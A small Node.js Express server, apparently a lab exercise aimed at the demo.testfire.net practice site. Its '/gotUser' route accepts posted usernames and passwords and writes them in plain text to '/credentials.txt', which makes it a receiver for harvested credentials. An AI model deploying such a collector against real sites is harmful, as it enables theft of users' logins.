const express = require('express'); 
const bodyParser = require('body-parser');
const router = express.Router();
const app = express();
var cors = require('cors');
var fs = require('fs');

var corsOptions = {
  origin: 'https://demo.testfire.net',
  optionsSuccessStatus: 200 
} 

app.use(bodyParser.json());      
app.use(bodyParser.urlencoded({extended: true}));
app.use(express.static(__dirname + '/views'));
   
router.get('/',(req,res) => {
    res.sendFile('index.html');
});

router.get('/getUser',(req,res) => {
    res.json({'id' : 1, 'name': 'vijay'});
});

router.post('/gotUser',(req,res) => {
    
    console.log(req.url);
    var username  = req.body.username;
    var password  = req.body.password;
    var data = "Username = "+ username+" password =" + password;
    
    fs.writeFile("/credentials.txt", data , function(err) {

        if(err) {
            return console.log(err);
        }
        console.log('Write Successful');
        res.sendStatus(200)
    });  
});
 

app.use('/', router);

app.listen(process.env.PORT || 8080,() => {
    console.log(`App Started on PORT ${process.env.PORT || 8080}`);
});